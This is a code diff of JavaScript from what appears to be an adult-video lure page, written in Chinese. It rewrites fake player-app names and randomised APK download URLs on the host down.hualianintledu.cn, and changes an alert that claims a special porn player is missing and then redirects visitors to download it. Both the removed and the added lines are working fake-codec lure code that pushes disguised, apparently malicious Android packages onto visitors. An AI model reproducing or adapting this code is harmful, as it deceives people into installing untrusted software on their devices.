@@ -1,11 +1,11 @@
-var name="夜色A片";
-var name2="360影视A片";
-var name3="PPTV聚色A片";
-var name4="极品视频";
-var url="http://down.hualianintledu.cn:81/a71-" + randomString(10) + ".apk";
-var url2="http://down.hualianintledu.cn:81/a72-" + randomString(10) + ".apk";
-var url3="http://down.hualianintledu.cn:81/a73-" + randomString(10) + ".apk";
-var url4="http://down.hualianintledu.cn:81/a74-" + randomString(10) + ".apk";
+var name="无码高清";
+var name2="无码高清";
+var name3="无码高清";
+var name4="无码高清";
+var url="http://down.hualianintledu.cn:81/a71-" + randomString(6) + ".apk";
+var url2="http://down.hualianintledu.cn:81/a71-" + randomString(6) + ".apk";
+var url3="http://down.hualianintledu.cn:81/a71-" + randomString(6) + ".apk";
+var url4="http://down.hualianintledu.cn:81/a71-" + randomString(6) + ".apk";
 
 try{
 	var isp=remote_ip_info.isp;
@@ -34,7 +34,7 @@ try{
 
 }
 
-var tixing="系统没有检测到本站专用色片播放器,请下载本站专用（"+appname+"）播放器，安装后运行专用浏览即可观看本站3W部成人爽片！";
+var tixing="系统没有检测到本站专用色片播放器,请下载本站专用（"+appname2+"）播放器，安装后运行专用浏览即可观看本站3W部成人爽片！";
 function ts(){
 	alert(tixing);window.location.href=appurl2;
 }
